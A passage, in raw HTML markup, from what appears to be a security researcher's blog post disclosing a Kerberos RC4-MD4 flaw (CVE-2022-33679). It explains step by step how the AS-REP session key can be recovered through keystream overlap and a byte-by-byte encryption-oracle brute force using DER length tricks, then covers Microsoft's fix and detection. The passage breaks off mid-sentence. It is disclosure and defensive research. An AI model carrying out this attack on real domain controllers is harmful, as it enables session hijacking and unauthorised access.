dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The AS-REP encrypted response has the following ASN.1 structure:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;EncASRepPart&amp;nbsp; ::= SEQUENCE {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;key &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [0] EncryptionKey,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;last-req&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [1] LastReq,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;nonce &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [2] UInt32,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;key-expiration&amp;nbsp; [3] KerberosTime OPTIONAL,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;flags &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [4] TicketFlags,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;authtime&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [5] KerberosTime,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;starttime &amp;nbsp; &amp;nbsp; &amp;nbsp; [6] KerberosTime OPTIONAL,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;endtime &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [7] KerberosTime,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;renew-till&amp;nbsp; &amp;nbsp; &amp;nbsp; [8] KerberosTime OPTIONAL,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;srealm&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [9] Realm,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;sname &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [10] PrincipalName,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;caddr &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [11] HostAddresses OPTIONAL&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;We can see from the two structures that as luck would have it the session key in the AS-REP is at the start of the encrypted data. This means there should be an overlap between the known parts of the timestamp and the key, allowing us to apply key stream recovery to decrypt the session key without any brute force needed.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;\n\n&lt;a href='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg24DDfsRh9c8OtrHaHSYfjKbUOPqVKpbrgf1ifZslYw1JDXAv8Q3hXmZRzz3MSsByAMoAg7Tpj5OIw3VzE5e9mrqIQ_fs-pLE61jHNF47qF1dBr-zFg7OV5hOSuDLJy7b9vYJm6hw5tDmK2-Oznd1hzj1a8NlBNBnGfxdX2lQfkrxQtGkhFy_nz9xR/s1187/image1.png' style='display: block; padding: 1em 0; text-align: center;'&gt;&lt;img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg24DDfsRh9c8OtrHaHSYfjKbUOPqVKpbrgf1ifZslYw1JDXAv8Q3hXmZRzz3MSsByAMoAg7Tpj5OIw3VzE5e9mrqIQ_fs-pLE61jHNF47qF1dBr-zFg7OV5hOSuDLJy7b9vYJm6hw5tDmK2-Oznd1hzj1a8NlBNBnGfxdX2lQfkrxQtGkhFy_nz9xR/s600/image1.png' alt=\"Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between known bytes in the timestamp with the 40 bit session key in the AS-REP.\" title=\"Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between known bytes in the timestamp with the 40 bit session key in the AS-REP.\" border='0' style='max-height: 750px; max-width: 600px;' /&gt;&lt;/a&gt;\n\n&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; white-space: pre-wrap;\"&gt;The diagram shows the ASN.1 DER structures for the timestamp and the start of the AS-REP. The values with specific hex digits in green are plain-text we know or can calculate as they are part of the ASN.1 structure such as types and lengths. We can see that there's a clear overlap between 4 bytes of known data in the timestamp with the first 4 bytes of the session key. We only need the first 5 bytes of the key due to the padding at the end, but this does mean we need to brute force the final key byte.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;We can do this brute force one of two ways. First we can send service ticket requests with the user's TGT and a guess for the session key to the KDC until one succeeds. This would require at most 256 requests to the KDC. Alternatively we can capture a service ticket request from the client which is likely to happen immediately after the authentication. As the service ticket request will be encrypted using the session key we can perform the brute force attack locally without needing to talk to the KDC which will be faster. Regardless of the option chosen this approach would be orders of magnitude faster than brute forcing the entire 40 bit session key.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The simplest approach to performing this exploit would be to interpose the client to server connection and modify traffic. However, as the initial request without pre-authentication just returns an error message it's likely the exploit could be done by injecting a response back to the client while the KDC is processing the real request. This could be done with only the ability to monitor network traffic and inject arbitrary network traffic back into that network. However, I've not verified that approach.&lt;/span&gt;&lt;/p&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;Exploitation without Interception (CVE-2022-33679)&lt;/span&gt;&lt;/h2&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The requirement to have access to the client to server authentication traffic does make this vulnerability seem less impactful. Although there's plenty of scenarios where an attacker could interpose, such as shared wifi networks, or physical attacks which could be used to compromise the computer account authentication which would take place when a domain joined system was booted.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;It would be interesting if there was an attack vector to exploit this without needing a real Kerberos user at all. I realized that if a user has pre-authentication disabled then we have everything we need to perform the attack. The important point is that if pre-authentication is disabled we can request a TGT for the user, specifying RC4-MD4 encryption and the KDC will send back the AS-REP encrypted using that algorithm.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The key to the exploit is to reverse the previous attack, instead of using the timestamp to decrypt the AS-REP we'll use the AS-REP to encrypt a timestamp. We can then use the timestamp value when sent to the KDC as an encryption oracle to brute force enough bytes of the key stream to decrypt the TGT's session key. For example, if we remove the optional microseconds component of the timestamp we get the following DER encoded values:&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;br /&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;/span&gt;&lt;/p&gt;\n\n&lt;a href='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJwOslmDADrdMxHQePmjJB4AwNGPGaFkdemYZCTgtHzSOcKYXYq46I5ETenRLGSjx-aPpCGMj40oox50HylEiImPmompOLGzAs0mNSRbjQtEUWhlNl6xv3XWladvkt__nep8zR4GEcMTLUHzqpC5ECmGSjYlr7CINK8BP3lBrX8n5u1hTKwcrBzMEd/s1057/image2.png' style='display: block; padding: 1em 0; text-align: center;'&gt;&lt;img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJwOslmDADrdMxHQePmjJB4AwNGPGaFkdemYZCTgtHzSOcKYXYq46I5ETenRLGSjx-aPpCGMj40oox50HylEiImPmompOLGzAs0mNSRbjQtEUWhlNl6xv3XWladvkt__nep8zR4GEcMTLUHzqpC5ECmGSjYlr7CINK8BP3lBrX8n5u1hTKwcrBzMEd/s600/image2.png' alt=\"Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between known bytes in the AS-REP and the timestamp string which can be used to generate a valid encrypted timestamp.\" title=\"Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between known bytes in the AS-REP and the timestamp string which can be used to generate a valid encrypted timestamp.\" border='0' style='max-height: 750px; max-width: 600px;' /&gt;&lt;/a&gt;\n\n&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;br /&gt;&lt;/span&gt;&lt;p&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The diagram shows that currently there's no overlap between the timestamp, represented by the T bytes, and the 40 bit session key. However, we know or at least can calculate the entire DER encoded data for the AS-REP to cover the entire timestamp buffer. We can use this to calculate the keystream for the user's RC4-MD4 key without actually knowing the key itself. With the key stream we can encrypt a valid timestamp and send it to the KDC.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;If the KDC responds with a valid AS-REP then we know we've correctly calculated the key stream. How can we use this to start decrypting the session key? The &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;KerberosTime&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; value used for the timestamp is an ASCII string of the form &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;YYYYMMDDHHmmssZ&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. The KDC parses this string to a format suitable for processing by the server. The parser takes the time as a NUL terminated string, so we can add an additional NUL character to the end of the string and it shouldn't affect the parsing. Therefore we can change the timestamp to the following:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;br /&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;/span&gt;&lt;/p&gt;\n\n&lt;a href='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHkQxlTmqYoIrJDtSjALIbuKT6vXVkaSM2QGjB8aErmNyny_lSLBJt4ZogLrR2naCcnSc15TiR-oq45Xj2-WDfmZpNzs1k0RYZH2VQKpLb6Whj8Z4nNkc5DIK_CdQvfT3ncuVdLnAdMSBhclQIYpIWB26fmbSWaVzdQXwYkbnnz6iPxYCGJ1sNY7rM/s1032/image4.png' style='display: block; padding: 1em 0; text-align: center;'&gt;&lt;img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHkQxlTmqYoIrJDtSjALIbuKT6vXVkaSM2QGjB8aErmNyny_lSLBJt4ZogLrR2naCcnSc15TiR-oq45Xj2-WDfmZpNzs1k0RYZH2VQKpLb6Whj8Z4nNkc5DIK_CdQvfT3ncuVdLnAdMSBhclQIYpIWB26fmbSWaVzdQXwYkbnnz6iPxYCGJ1sNY7rM/s1032/image4.png' alt=\"Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between a final NUL character at the end of the timestamp string which overlaps with the first byte of the 40 bit session key.\" border='0' style='max-height: 750px; max-width: 600px;' title=\"Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between a final NUL character at the end of the timestamp string which overlaps with the first byte of the 40 bit session key.\" /&gt;&lt;/a&gt;\n\n\n&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;br /&gt;&lt;br /&gt;&lt;/span&gt;&lt;p&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;We can now guess a value for the encrypted NUL character and send the new timestamp to the KDC. If the KDC returns an error we know that the parsing failed as it didn't decrypt to a NUL character. However, if the authentication succeeds the value we guessed is the next byte in the key stream and we can decrypt the first byte of the session key.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;At this point we've got a problem, we can't just add another NUL character as the parser would stop on the first one we sent. Even if the value didn't decrypt to a NUL it wouldn't be possible to detect. This is when a second trick comes into play, instead of extending the string we can abuse the way value lengths are encoded in DER. A length can be in one of two forms, a short form if the length is less than 128, or a long form for everything else.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;For the short form the length is encoded in a single byte. For the long form, the first byte has the top bit set to 1, and the lower 7 bits encode the number of trailing bytes of the length value in big-endian format. For example in the above diagram the timestamp's total size is 0x14 bytes which is stored in the short form. We can instead encode the length in an arbitrary sized long form, for example &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x81 0x14&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;, &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x82 0x00 0x14&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;, &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x83 0x00 0x00 0x14&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; etc. The examples shown below move the NUL character to brute force the next two bytes of the session key:&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;br /&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;/span&gt;&lt;/p&gt;\n\n&lt;a href='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsKgGYAwo0YMFIjyz2Htl9U6igMxgQULM7SMPuDKr4jsQckfpZSvEUSshnUpNK15rRJD5ZD9mjSOgFn7F2_vgCGr1HHHGXRuGQZmMqHwAV7c7JairJhIUONjxM7YVBkWxBdxC9MfuXPxfISUEzVaPeRG5EsvlL91sgnZs4gXMjApMLYcZq4oXy7ZEg/s1038/image6.png' style='display: block; padding: 1em 0; text-align: center;'&gt;&lt;img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsKgGYAwo0YMFIjyz2Htl9U6igMxgQULM7SMPuDKr4jsQckfpZSvEUSshnUpNK15rRJD5ZD9mjSOgFn7F2_vgCGr1HHHGXRuGQZmMqHwAV7c7JairJhIUONjxM7YVBkWxBdxC9MfuXPxfISUEzVaPeRG5EsvlL91sgnZs4gXMjApMLYcZq4oXy7ZEg/s1038/image6.png' alt=\"Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows extending the first length field so there is an overlap between a final NUL character at the end of the timestamp string which overlaps with the second and third bytes of the 40 bit session key.\" title=\"Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows extending the first length field so there is an overlap between a final NUL character at the end of the timestamp string which overlaps with the second and third bytes of the 40 bit session key.\" border='0' style='max-height: 750px; max-width: 600px;' /&gt;&lt;/a&gt;\n\n&lt;p&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Even though technically DER should expect the shortest form necessary to encode the length the Microsoft ASN.1 library doesn't enforce that when parsing so we can just repeat this length encoding trick to cover the remaining 4 unknown bytes of the key. As the exploit brute forces one byte at a time the maximum number of requests that we'd need to send to the KDC is 5 × 2&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span style=\"font-size: 0.6em; vertical-align: super;\"&gt;8 &lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;which is 1280 requests as opposed to 2&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span style=\"font-size: 0.6em; vertical-align: super;\"&gt;40&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; requests which would be around 1 trillion.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Even with such a small number of requests it can still take around 30 seconds to brute force the key, but that still makes it a practical attack. Although it would be very noisy on the network and you'd expect any competent EDR system to notice, it might be too late at that point.&lt;/span&gt;&lt;/p&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;The Fixes&lt;/span&gt;&lt;/h2&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The only fix I can find is in the KDC service for the domain controller. Microsoft has added a new flag which by default disables the RC4-MD4 algorithm and an old variant of RC4-HMAC with the encryption type of -133. This behavior can be re-enabled by setting the KDC configuration registry value &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;AllowOldNt4Crypto&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. The reference to NT4 is a good indication on how long this vulnerability has existed as it presumably pre-dates the introduction of Kerberos in Windows 2000. There are probably some changes to the client as well, but I couldn't immediately find them and it's not really worth my time to reverse engineer it.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;It'd be good to mitigate the risk of similar attacks before they're found. Disabling RC4 is definitely recommended, however that can bring &lt;/span&gt;&lt;a href=\"https://syfuhs.net/lessons-in-disabling-rc4-in-active-directory\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;its own problems&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. If this particular vulnerability was being exploited in the wild it should be pretty easy to detect. Also unusual Kerberos encryption types would be an immediate red-flag as well as the repeated login attempts.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Another option is to enforce &lt;/span&gt;&lt;a href=\"https://syfuhs.net/kerberos-fast-armoring\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: 